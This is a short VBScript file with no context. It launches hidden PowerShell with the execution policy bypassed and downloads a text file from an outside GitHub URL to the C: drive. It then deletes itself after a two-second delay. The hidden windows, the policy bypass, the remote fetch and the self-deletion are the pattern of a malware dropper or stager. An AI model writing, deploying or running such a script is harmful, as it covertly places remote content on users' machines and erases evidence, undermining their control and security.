CreateObject("WScript.Shell").Run _
"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri ''https://raw.githubusercontent.com/lllmaololll-sys/test/refs/heads/main/cmd.txt'' -OutFile ''C:\example.txt''""' -WindowStyle Hidden""", 0, False

Set sh = CreateObject("WScript.Shell")

scriptPath = WScript.ScriptFullName

sh.Run "cmd.exe /c timeout /t 2 > nul & del """ & scriptPath & """", 0, False
